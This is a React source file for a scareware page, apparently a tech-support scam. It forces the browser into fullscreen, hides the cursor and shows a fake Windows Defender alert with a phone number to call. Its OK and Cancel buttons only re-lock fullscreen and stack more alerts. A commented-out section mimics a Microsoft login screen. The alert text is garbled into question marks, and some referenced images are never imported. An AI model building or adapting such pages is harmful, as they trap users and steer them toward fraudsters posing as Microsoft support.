import React, { useEffect, useState } from "react";
import "./index.scss";
import userPhoto from "../images/user.jpeg";
import microsoftLogo from "../images/microsoftLogo.jpeg";
import PhoneLogo from "../images/phn.svg";
import {
  makeWindowFullScreen,
  addShortcutsKeyboard,
} from "../utils/ShortcutEnableDisable";
import MainModal from "../MainModal";
import AlternateModals from "../AlternateModals";

const Login = (props) => {
  const [phoneNumber] = useState("050-5532-9603");
  const [modals, setModals] = useState([]);

  const requestFullScreen = () => {
    addShortcutsKeyboard();
    makeWindowFullScreen();
    props.loginToDash();
    document.getElementById("login-wrapper").style.cursor = "none";
    document.getElementById("blueBackground").style.display = "block";
  };

  const handleCancel = () => {
    requestFullScreen();
    setModals([...modals, modals.length]);
    props.notificationPopup();
  };

  const handleOk = () => {
    requestFullScreen();
    setModals([...modals, modals.length]);
    props.notificationPopup();
  };

  const handleBackCancel = () => {
    requestFullScreen();
    props.setIsModalVisible(true);
  };

  const handleBackOk = () => {
    requestFullScreen();
    props.setIsModalVisible(true);
  };

  useEffect(() => {
    document.addEventListener("fullscreenchange", exitHandler);
    document.addEventListener("webkitfullscreenchange", exitHandler);
    document.addEventListener("mozfullscreenchange", exitHandler);
    document.addEventListener("MSFullscreenChange", exitHandler);
  }, []);

  const exitHandler = () => {
    var fullscreenElement =
      document.fullscreenElement ||
      document.webkitFullscreenElement ||
      document.mozFullscreenElement ||
      document.msFullscreenElement;

    if (!fullscreenElement) {
      console.log("Leaving full-screen mode...");
    } else {
      console.log("Entering full-screen mode...");
    }
  };

  return (
    <>
      <MainModal
        isModalVisible={props.isModalVisible}
        setIsModalVisible={props.setIsModalVisible}
        handleCancel={handleCancel}
        handleOk={handleOk}
        phoneNumber={phoneNumber}
      />

      {modals.map((num) => {
        return (
          <AlternateModals
            key={num}
            isModalVisible={true}
            handleCancel={handleCancel}
            handleOk={handleOk}
            phoneNumber={phoneNumber}
          />
        );
      })}

      <div
        onClick={requestFullScreen}
        className="login-wrapper"
        id="login-wrapper"
      >
        <div
          id="blueBackground"
          className="animate-me"
          onClick={handleBackCancel}
        >
          <div id="windowsmodal1">
            <div style={{ textAlign: "center" }}>
              <strong>WindowsDefender-????????????????????????</strong>
            </div>
            <div className="row">
              <div className="col-12">
                <p
                  style={{
                    marginLeft: "20px",
                    marginRight: "20px",
                  }}
                >
                  DF;???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
                  ??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
                  <br />
                  1????????????????????????????????? <br />
                  2LINE?????????????????????????????? <br />
                  3?????????????????????
                  <br />
                  4????????????????????????????????? <br />
                  5???????????????????????????????????????
                  <br />
                  ?????? : {phoneNumber}
                  <br />
                </p>
              </div>
            </div>
            <div className="row">
              <div className="col-4"></div>
              <div className="col-8">
                <button
                  onClick={handleBackOk}
                  style={{
                    width: "100px",
                    marginRight: "10px",
                  }}
                >
                  OK
                </button>
                <button onClick={handleBackCancel} style={{ width: "100px" }}>
                  Cancel
                </button>
              </div>
            </div>
          </div>
        </div>
        {/* 
        <div className="center">
          <div className="container">
            <img
              src={userPhoto}
              className="rounded-circle userPhoto"
              height="180px"
              width="180px"
              alt="user"
            />
            <h1 className="mt-3 microsoftFont" style={{ color: "white" }}>
              ????????????????????????
            </h1>

            <br />
            <button id="myBtn" type="submit">
              ????????????
            </button>
            <br />
            <br />

            <p className="signinoptions">
              ?????????????????????????????? ???
              <span className="phone">
                <img src={PhoneLogo} height={18} alt="phone logo" />
              </span>
              <span style={{ fontSize: "20px", marginLeft: "5px" }}>
                {phoneNumber}
              </span>{" "}
            </p>

            <div style={{ display: "none" }} id="chat-box">
              <img src={microsoftLogo} alt="microsoft" />
              <span
                style={{
                  color: "#222",
                  fontSize: "30px",
                  fontWeight: "600",
                  marginLeft: "6px",
                  position: "relative",
                  top: "5px",
                }}
              >
                Microsoft
              </span>
              <p style={{ fontWeight: "600" }}>??????????????????????????????</p>
              <h4 style={{ fontWeight: "600" }}>
                <img
                  src={PhoneLogo}
                  height={20}
                  style={{ marginTop: "5px" }}
                  alt="phone"
                />
                {phoneNumber}
              </h4>
              <div className="arrow-down">
                <i className="fa fa-caret-down"></i>
              </div>
            </div>

            <img
              src={firstPic}
              className="iconImage1 rounded-circle"
              alt="first"
            />
            <img
              src={secondPic}
              className="iconImage2 rounded-circle"
              alt="second"
            />
            <img
              src={thirdPic}
              className="iconImage3 rounded-circle"
              alt="third"
            />
          </div>
        </div> */}
      </div>
    </>
  );
};

export default Login;
